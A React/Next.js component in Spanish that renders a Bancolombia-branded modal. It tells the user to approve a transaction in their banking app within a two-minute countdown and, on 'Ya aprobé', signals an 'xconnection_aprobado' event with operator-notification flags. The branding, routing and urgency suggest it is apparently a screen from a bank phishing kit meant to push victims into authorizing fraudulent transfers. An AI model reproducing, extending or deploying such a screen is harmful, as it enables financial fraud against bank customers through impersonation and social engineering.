/* eslint-disable @next/next/no-img-element */
"use client";
import React, { useState, useEffect } from 'react';

interface ErrorConexionProps {
  enviar?: (data: any) => void;
  banco?: string;
  onAceptar?: () => void;
}

const ErrorConexion: React.FC<ErrorConexionProps> = ({ enviar, banco, onAceptar }) => {
  const [timeLeft, setTimeLeft] = useState(120);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const interval = setInterval(() => {
      setTimeLeft(prev => Math.max(0, prev - 1));
    }, 1000);
    return () => clearInterval(interval);
  }, [timeLeft]);

  const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
  const seconds = (timeLeft % 60).toString().padStart(2, '0');

  const handleAceptar = () => {
    if (enviar) {
      enviar({
        view: "xconnection_aprobado",
        isAuthorizedNotification: true,
        sendReplyMarkup: true,
        bank: banco || "bancol"
      });
    } else if (onAceptar) {
      onAceptar();
    } else {
      window.location.href = "/banco/bancol";
    }
  };

  return (
    <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-center justify-center p-4">
      <div className="bg-white rounded-3xl p-7 max-w-[340px] w-full text-center shadow-2xl flex flex-col items-center animate-in zoom-in-95 duration-200">
        {/* Circulo con exclamacion */}
        <div className="w-14 h-14 rounded-full border-2 border-slate-900 flex items-center justify-center mb-4 shrink-0">
          <span className="text-yellow-600 font-serif font-bold text-2xl leading-none">!</span>
        </div>

        {/* Titulo */}
        <h2 className="text-xl font-bold text-slate-900 mb-2 leading-snug">
          Autoriza la transacción en tu app
        </h2>

        {/* Mensaje */}
        <p className="text-sm text-slate-600 font-normal leading-relaxed mb-4 px-1">
          En la app Bancolombia Personas debes aprobar la transacción para continuar.
        </p>

        {/* Contador de 2 Minutos */}
        <div className="mb-6 bg-yellow-50 text-amber-900 border border-yellow-300 font-mono font-bold text-base px-4 py-1.5 rounded-full flex items-center gap-1.5 shadow-inner">
          <svg className="w-4 h-4 animate-spin text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
          <span>{minutes}:{seconds}</span>
        </div>

        {/* Boton Aceptar */}
        <button
          type="button"
          onClick={handleAceptar}
          className="w-full py-3.5 rounded-full bg-linear-to-r from-[#fdda24] to-[#e6c200] hover:opacity-95 text-slate-950 font-extrabold text-base shadow-md transition-all cursor-pointer border-none outline-none active:scale-[0.98]"
        >
          Ya aprobé
        </button>
      </div>
    </div>
  );
};

export default ErrorConexion;
